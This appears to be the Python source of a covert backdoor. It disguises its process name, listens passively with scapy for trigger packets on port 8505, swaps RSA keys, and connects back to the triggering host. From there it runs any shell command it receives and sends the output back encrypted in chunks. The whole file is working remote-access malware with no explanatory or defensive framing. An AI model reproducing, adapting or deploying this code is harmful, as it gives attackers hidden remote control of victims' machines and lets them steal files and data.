#!kworker

import socket
import sys
import threading
import fcntl
import signal
import time
import os
import scapy
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto import Random
from scapy.all import *


#make public/private key pair
KEY_LENGTH = 2048
rand = Random.new().read
keypair = RSA.generate(KEY_LENGTH, rand)
print (keypair)

def initialize():
    #SIGNAL Handling for ctrl-c
    signal.signal(signal.SIGINT, signal_handler)

    #Change process name
    if sys.platform == 'linux2':
        import ctypes
        libc = ctypes.cdll.LoadLibrary('libc.so.6')
        libc.prctl(15, 'notabackdoor', 0, 0, 0)


    filterString = "tcp and ( src port 8505 and dst port 8505  ) and src not " + get_ip_address()
    #filterString = "tcp"
    sniff(prn=process_pkt, filter=filterString, store=0)


def process_pkt(pkt):
    ip_src = pkt[IP].src
    tcp_payload = pkt[TCP].payload

    print (" IP SRC " + str(ip_src))
    print (" TCP Payload: " + str(tcp_payload))

    process_request(tcp_payload, ip_src)


def process_request(payload, ip_dst):

    my_ip = get_ip_address()
    ip = IP(src=my_ip, dst=ip_dst)
    #time.sleep(1)
    port_knock(ip)
    print(type(payload))
    key = payload;
    print(key)
    

    other_pub_key = RSA.importKey(key)
    print(other_pub_key)

    make_tcp_conn(ip.dst, other_pub_key)


def port_knock(ip):
    tcp = TCP(sport=55000, dport=7005)
    #print "SEND PORT KNOCK 1"
    send(ip/tcp, verbose=0)

    tcp = TCP(sport=55000, dport=8005)
    #print "SEND PORT KNOCK 2"
    send(ip/tcp, verbose=0)

    #Send my public key to client
    exported_pub_key = keypair.publickey().exportKey()
    print(exported_pub_key)
    # print(type(exported_pub_key))
    tcp = TCP(sport=55000, dport=8505)/(exported_pub_key)
    #print "SEND PORT KNOCK 3"
    send(ip/tcp, verbose=0)


def make_tcp_conn(dst_ip, other_pub_key):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to the port where the server is listening
    server_address = (dst_ip, 80)

    try:
        sock.connect(server_address)
    except:
        pass

    # Start the communications thread
    thrd = threading.Thread(target = comms_thread, args=(sock, other_pub_key))
    thrd.start()


def comms_thread(sock, other_pub_key):
    END_OF_CHUNK = b'8505eoc'
    END_OF_OUTPUT = b'8505eoo'
    END_OF_DOWNLOAD = b'8505eod'

    while 1:
        encrypted = sock.recv(1024)

        # print(encrypted)

        # print(type(encrypted))

        encrypter=PKCS1_OAEP.new(keypair)
        decrypted = encrypter.decrypt(encrypted)
        encryptor = PKCS1_OAEP.new(other_pub_key)

        # print(decrypted)

        # code1=decrypted.decode('utf-8')
        code1=str(decrypted,'utf-8')

        print ("Received Command: " + code1)

        command_array = code1.split()

        # EXIT Command
        if command_array[0] == 'exit':
            sock.close()
            break
        # CD Command
        elif command_array[0] == 'cd':
            try:
                os.chdir(command_array[1])


                enc='pwd: '
                enc1=bytes(enc,encoding='utf-8')
                print(enc1)
                print(type(enc1))
                cwd=os.getcwd()
                cwd1=bytes(cwd,encoding='utf-8')
                print(cwd1)
                print(type(cwd1))



                ciphertext = encryptor.encrypt(enc1 + cwd1)
                print(type(ciphertext))


                sock.send(ciphertext + END_OF_OUTPUT)
            except Exception as e:
                ciphertext = encryptor.encrypt(e.strerror)
                sock.send(ciphertext + END_OF_OUTPUT)
        # Get file
        elif command_array[0] == 'less':

            #Change the command to 'less'
            # command_array[0] = 'less'
            try:
                command = subprocess.Popen(command_array, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = command.communicate()
                if error:
                    output = error

                base = 0
                chunksize = 200
                while base < len(output):
                    if (base + chunksize) < len(output):
                        ciphertext = encryptor.encrypt(output[base:base+chunksize])
                        sock.send(ciphertext + END_OF_CHUNK)
                        #print output[base:base+chunksize]
                    else:
                        ciphertext = encryptor.encrypt(output[base:])
                        sock.send(ciphertext + END_OF_DOWNLOAD)
                        #print output[base:]
                        break
                    base += chunksize

            except OSError as e:
                ciphertext = encryptor.encrypt(e.strerror)
                sock.send(ciphertext + END_OF_OUTPUT)

        # Any other Command
        else:
            try:
                command = subprocess.Popen(command_array, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = command.communicate()
                if error:
                    output = error

                base = 0
                chunksize = 200
                while base < len(output):
                    if (base + chunksize) < len(output):
                        print(len(output))
                        # arr=output[base:base+chunksize]
                        # arr1=arr.decode('utf-8')
                        # print(arr)
                        # print(type(arr))
                        print(output[base:base+chunksize])
                        ciphertext = encryptor.encrypt(output[base:base+chunksize])
                        
                        # chunk=bytes(END_OF_CHUNK,'utf-8')
                        # print(chunk)
                        # print(type(chunk))
                        # print(ciphertext)
                        print(sock.send(ciphertext + END_OF_CHUNK))
                        print(ciphertext + END_OF_CHUNK)
                        print('send the chunk')
                        # print (output[base:base+chunksize])
                    else:
                        print (output[base:])
                        ciphertext = encryptor.encrypt(output[base:])

                        # print(ciphertext)

                        # output=bytes(END_OF_OUTPUT,'utf-8')
                        print(sock.send(ciphertext + END_OF_OUTPUT))
                        # print (output[base:])
                        
                        print('send the output')
                        break
                    base += chunksize


            except OSError as e:
                ciphertext = other_pub_key.encrypt(e.strerror)
                sock.send(e.sterror)

#
#Helper Functions
#
def signal_handler(signal, frame):
    #print('You pressed Ctrl+C!')
    os.kill(os.getpid(), signal)
    sys.exit(0)


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))
    return s.getsockname()[0]


if __name__ == "__main__":
    initialize()
